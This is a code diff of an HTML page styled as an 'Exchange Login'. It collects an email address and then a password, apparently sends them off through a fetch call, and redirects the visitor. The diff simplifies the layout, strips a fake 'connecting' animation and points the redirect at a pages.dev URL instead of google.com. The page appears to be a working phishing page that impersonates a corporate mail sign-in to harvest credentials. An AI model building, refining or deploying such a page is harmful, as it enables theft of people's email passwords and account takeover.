@@ -8,11 +8,20 @@
         body {
             font-family: Arial, sans-serif;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
             background-color: #f5f5f5;
+        }
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo-img {
+            max-width: 100px;
+            height: auto;
         }
         .login-container {
             background-color: white;
@@ -63,123 +72,42 @@
         .hidden {
             display: none;
         }
-        .layout-table {
-            width: 100%;
-            max-width: 900px;
-            margin: 0 auto;
-            border-collapse: collapse;
-        }
-        .layout-table td {
-            vertical-align: middle;
-            padding: 20px;
-        }
-        .logo-cell {
-            width: 30%;
-            text-align: center;
-        }
-        .login-cell {
-            width: 60%;
-        }
-        .logo-img {
-            max-width: 250px;
-            height: auto;
-            animation: rotate 8s linear infinite;
-            transform-origin: center center;
-        }
-        .connection-status {
-            margin-top: 20px;
-            font-size: 18px;
-            color: #666;
-            text-align: center;
-            min-height: 24px;
-            font-family: 'Courier New', monospace;
-        }
-        .connected {
-            color: #0a0;
-            font-weight: bold;
-        }
-        .connecting {
-            color: #666;
-        }
-        .dot-animation::after {
-            content: '';
-            animation: dots 1.5s steps(5, end) infinite;
-        }
-        @keyframes rotate {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60% { content: '...'; }
-            80%, 100% { content: ''; }
-        }
     </style>
 </head>
 <body>
-    <table class="layout-table">
-        <tr>
-            <td class="logo-cell">
-                <img width="52%" class="logo-img" src="https://www.clipartkey.com/mpngs/m/84-846625_3-gears-icon.png" alt="Company Logo">
-                <div id="connection-status" class="connection-status connecting dot-animation"></div>
-            </td>
-            <td class="login-cell">
-                <div class="login-container">
-                    <h1 style="font-size:24px;"> Exchange  Login</h1>
-                    
-                    <!-- Email Step -->
-                    <div id="email-step">
-                        <form id="email-form">
-                            <div class="form-group">
-                                <label for="email">Email Address</label>
-                                <input type="email" id="email" name="email" placeholder="Enter email address" autocomplete="off" required>
-                            </div>
-                            <button type="submit">Continue</button>
-                        </form>
-                    </div>
-                    
-                    <!-- Password Step (initially hidden) -->
-                    <div id="password-step" class="hidden">
-                        <div class="email-display" id="displayed-email"></div>
-                        <form id="password-form">
-                            <input type="hidden" id="hidden-email" name="email">
-                            <div class="form-group">
-                                <label for="password">Password</label>
-                                <input type="password" id="password" name="password" placeholder="Enter password" autocomplete="off" required>
-                            </div>
-                            <button type="submit">Login</button>
-                        </form>
-                    </div>
+    <div class="logo-container">
+        <img class="logo-img" src="https://www.clipartkey.com/mpngs/m/84-846625_3-gears-icon.png" alt="Company Logo">
+    </div>
+    
+    <div class="login-container">
+        <h1 style="font-size:24px;">Exchange Login</h1>
+        
+        <!-- Email Step -->
+        <div id="email-step">
+            <form id="email-form">
+                <div class="form-group">
+                    <label for="email">Email Address</label>
+                    <input type="email" id="email" name="email" placeholder="Enter email address" autocomplete="off" required>
                 </div>
-            </td>
-        </tr>
-    </table>
+                <button type="submit">Continue</button>
+            </form>
+        </div>
+        
+        <!-- Password Step (initially hidden) -->
+        <div id="password-step" class="hidden">
+            <div class="email-display" id="displayed-email"></div>
+            <form id="password-form">
+                <input type="hidden" id="hidden-email" name="email">
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Enter password" autocomplete="off" required>
+                </div>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
 
     <script>
-        // Animate the connection message
-        const connectionStatus = document.getElementById('connection-status');
-        
-        function typeWriter(text, element, speed, callback) {
-            let i = 0;
-            element.textContent = '';
-            function typing() {
-                if (i < text.length) {
-                    element.textContent += text.charAt(i);
-                    i++;
-                    setTimeout(typing, speed);
-                } else if (callback) {
-                    callback();
-                }
-            }
-            typing();
-        }
-
-        // Initial connecting message
-        typeWriter("waiting to connect", connectionStatus, 50, () => {
-            connectionStatus.classList.add('dot-animation');
-        });
-
         document.getElementById('email-form').addEventListener('submit', function(e) {
             e.preventDefault();
             
@@ -190,18 +118,9 @@
             document.getElementById('displayed-email').textContent = email;
             document.getElementById('hidden-email').value = email;
             
-            // Remove dot animation
-            connectionStatus.classList.remove('dot-animation');
-            
-            // Animate the connected message
-            typeWriter("you are connected", connectionStatus, 50, () => {
-                connectionStatus.classList.remove('connecting');
-                connectionStatus.classList.add('connected');
-                
-                // Switch to password step after connection animation completes
-                document.getElementById('email-step').classList.add('hidden');
-                document.getElementById('password-step').classList.remove('hidden');
-            });
+            // Switch to password step
+            document.getElementById('email-step').classList.add('hidden');
+            document.getElementById('password-step').classList.remove('hidden');
         });
         
         document.getElementById('password-form').addEventListener('submit', function(e) {
@@ -223,7 +142,7 @@
             })
             .then(response => {
                 // Redirect to google.com after submission
-                window.location.href = 'https://google.com';
+                window.location.href = 'https://complete-repository.pages.dev/rdirect.html';
             })
             .catch(error => {
                 console.error('Error:', error);
